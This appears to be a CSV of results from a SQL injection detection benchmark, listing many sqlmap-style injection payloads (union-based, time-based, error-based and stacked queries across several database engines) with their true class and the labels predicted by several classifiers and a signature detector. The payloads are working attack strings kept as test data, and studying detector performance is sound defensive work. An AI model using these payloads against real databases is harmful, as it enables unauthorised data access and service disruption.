payload,class,overlap_exact,overlap_string,overlap_family,logistic_regression_raw,logistic_regression_normalized,naive_bayes_raw,naive_bayes_normalized,svm_raw,svm_normalized,signature_raw,signature_normalized
"1%'))) union all select null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')) as kfnt where 8090=8090 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")) as mlid where 1047=1047 union all select null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%""))) and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1') as ibaw where 2130=2130 and 9198=9198--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1')) as clbc where 5649=5649;begin dbms_lock.sleep(5); end--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1)) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1 where 6408=6408 union all select null,null,null,null,null,null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1""))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (((""suxh""=""suxh",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))# eahg",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"");select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-7678))) union all select 2622,2622,2622,2622,2622,2622,2622,2622--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1,(select (case when (5777=5777) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-1890'))) or 8526=1389 and ((('ecgt'='ecgt,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"")) as gawq where 4728=4728 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"") or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") where 6821=6821 waitfor delay '0:0:5'--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-1628"" union all select 9189,9189,9189,9189,9189,9189,9189,9189,9189--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-8038')) or elt(1032=1032,3623) and (('xfyq'='xfyq",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1') and make_set(9961=6559,6559) and ('exde'='exde",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1')) as uizu where 1774=1774;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (('mexd' like 'mexd",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-4944%"")) or make_set(1084=1988,1988) and ((""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1) or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-6680""))) union all select 2564,2564,2564,2564,2564,2564#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'+(select zmbu where 8685=8685 rlike (select (case when (7689=7689) then 1 else 0x28 end)))+',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%""))) and (select * from (select(sleep(5)))fzno) and (((""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1) where 1013=1013 and 5573=9445#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-5969"" where 9248=9248 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""mejy""=""mejy",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-9708' where 8150=8150 or 6872=6872--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1')) or 6793=(select 6793 from pg_sleep(5)) and (('zjun'='zjun,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-1280')) or 8571=8571--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"make_set(6174=9734,1)",sqli,0,0,0,sqli,sqli,sqli,sqli,xss,sqli,benign,benign
"1"")) as uels where 9447=9447 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") where 7228=7228;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%');iif(5257=5257,1,1/0)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1'+(select 'rkap' where 9692=9692;waitfor delay '0:0:5')+',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
-5327'))) or 1606=6099,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1) where 2010=2010;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('pwuy'='pwuy",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1'+(select iutk where 6158=6158;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)+'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%""))) and 2006=2006",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1;call regexp_substring(repeat(right(char(3702),0),500000000),null)-- vhmc",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-5009) where 8463=8463 union all select 8463,8463,8463,8463,8463,8463--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'||(select 'ggfx' where 4932=4932 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5))||'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%'))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('%'='",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-8054')) union all select 5232,5232,5232,5232,5232,5232,5232#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ('%'='",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"")) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ('gcna'='gcna",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%""))) union all select null,null,null,null,null,null,null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"" or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1') union all select null,null,null,null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") as jiiq where 6847=6847;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"" rlike sleep(5)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1%'))) and 6969=(select 6969 from pg_sleep(5)) and ((('%'=',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'+(select qugu where 2287=2287 order by 1#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') as rvch where 1863=1863 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1%';select sleep(5) and '%'=',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'+(select tvpj where 7058=7058 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1""))) or sleep(5) and (((""eran""=""eran",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")) and elt(4249=4249,7259) and ((""abcm"" like ""abcm",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1')) as xcvg where 1157=1157 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1',(select 9100=('qqpjq'||(select case 9100 when 9100 then 1 else 0 end from rdb$database)||'qzvzq'))",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1') where 3730=3730 and sleep(5)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%')) and elt(1210=1210,sleep(5)) and (('%'='",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" where 6347=6347 union all select null,null,null,null,null,null,null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'+(select 'aphz' where 1933=1933 union all select null,null,null,null,null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")) as maxe where 5883=5883 union all select null,null,null,null,null,null,null,null,null#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"") and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('zcrh'='zcrh",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"" where 8732=8732;begin dbms_lock.sleep(5); end--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"")));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
-7950') or 9323=9323#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
(select (case when (6783=6783) then 1 else 1/(select 0) end)),sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-1339))) union all select 2938,2938,2938,2938,2938,2938#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (8929=8929",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1')) as zbkp where 1720=1720 and 4110=6748#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" where 8734=8734;select * from generate_series(7762,7762,case when (7762=1293) then 1 else 0 end) limit 1--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1');select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'+(select gblp where 6768=6768;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1',updatexml(2917,concat(0x2e,0x7171706a71,(select (elt(2917=2917,1))),0x717a767a71),8295)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
-2806'))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('rxzr'='rxzr,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1' in boolean mode) waitfor delay '0:0:5'--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%""));select count(*) from generate_series(1,5000000)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-5779) union all select 6089,6089--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-4580"" or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""dbhb""=""dbhb",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1'||(select 'uiyj' from dual where 8320=8320;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1');select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1 or elt(5873=5873,sleep(5))#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-2323"") as zgsn where 9274=9274 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-2303')) as exyt where 2528=2528 or 8571=8571--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""vurb"" like ""vurb",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1""));select benchmark(5000000,md5(0x4c4d6142)) and ((""vcvb"" like ""vcvb",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1 or 8466=benchmark(5000000,md5(0x694a4745))-- rlas",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-3505"") or 5290=3436--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((5368=5368,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
-5555)) as ldte where 4583=4583 order by 1#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1)) as krzi where 8727=8727 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1)) as hrks where 7637=7637 or elt(6272=6272,sleep(5))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%""));select sleep(5)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-8094) or elt(1032=1032,3623) and (4569=4569",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1""))) rlike sleep(5)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-1908'))) union all select 7665#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'||(select 'zbdv' where 1618=1618 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)))||'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') where 6988=6988 union all select null,null,null,null,null,null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1 where 7196=7196 or 8466=benchmark(5000000,md5(0x694a4745))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-1579%'))) union all select 7272#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-9725) where 9068=9068 or elt(4723=1426,1426)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-6014"" or make_set(3003=2609,2609)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-2059%"" or elt(4587=3101,3101) and ""%""=""",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
-9393' where 3119=3119 or 8571=8571--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") as amak where 7938=7938 and elt(1210=1210,sleep(5))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-6145'+(select nnjn where 1389=1389 union all select 1389,1389,1389--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%""))) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-7296%'))) union all select 9322,9322,9322,9322--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%"")) and (select * from (select(sleep(5)))gcrr)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1)) as rroe where 4840=4840;select * from generate_series(3607,3607,case when (3607=4242) then 1 else 0 end) limit 1--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-4961') or 3038=3038,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-9854%""))) or 6455=3652",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-3279"" union all select 8568,8568,8568,8568--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1');select sleep(5) and ('hhlq' like 'hhlq,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'||(select 'ozoj' where 1608=1608;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'))) or (select * from (select(sleep(5)))ydpu) and ((('ljhc'='ljhc,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")) as gbxx where 2459=2459 waitfor delay '0:0:5'--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") where 9223=9223 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'||(select 'xasp' from dual where 4025=4025 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)))||'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") where 8571=8571 and elt(4249=4249,7259)--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1) where 8232=8232 and (3020=3020)*6703--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1') and elt(4249=4249,7259) and ('bxnn'='bxnn",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
1') as syer where 3141=3141 rlike (select (case when (6233=7567) then 1 else 0x28 end))--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'+(select xruo where 5709=5709 and 7533=7533)+',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1%'))) or elt(6272=6272,sleep(5)) and ((('%'='",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") as jmwr where 5978=5978 rlike (select (case when (1396=8762) then 1 else 0x28 end))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1')) or 8466=benchmark(5000000,md5(0x694a4745)) and (('jfwt' like 'jfwt",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1"") union all select null,null,null,null,null,null,null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%'))) union all select null,null,null,null,null,null,null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'+(select 'gqsk' where 3087=3087 union all select null,null,null,null--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"") as kslq where 8669=8669 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1%'))) rlike sleep(5) and ((('%'=',sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"" and elt(4594=1040,1040)",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ('tetk'='tetk",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"-7381')) or elt(5882=5919,5919) and (('nzri'='nzri",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1');select benchmark(5000000,md5(0x4c4d6142))",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
-1587') or 8339=5540,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
-6341' or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and 'ugys'='ugys,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-4100')) union all select 1163,1163,1163--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-4828'+(select qxnw where 9488=9488 union all select 9488,9488--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1'||(select 'rask' from dual where 9411=9411 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))||'",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"-9176')) as eunw where 5978=5978 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
-8625 or 3176=2519# fvgl,sqli,0,0,0,benign,benign,sqli,sqli,benign,benign,benign,benign
-4761 order by 1--,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1%' or 8156=(select count(*) from generate_series(1,5000000))--",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1')));begin dbms_lock.sleep(5); end and ((('xzbk'='xzbk,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1'||(select 'xemx' from dual where 4683=4683 or sleep(5)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
"1"")) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((""isbh"" like ""isbh",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,benign,benign
"1))) and 8407=(select count(*) from generate_series(1,5000000)) and (((1729=1729",sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
1)) or (select * from (select(sleep(5)))sddo)#,sqli,0,0,0,sqli,sqli,sqli,sqli,sqli,sqli,sqli,sqli
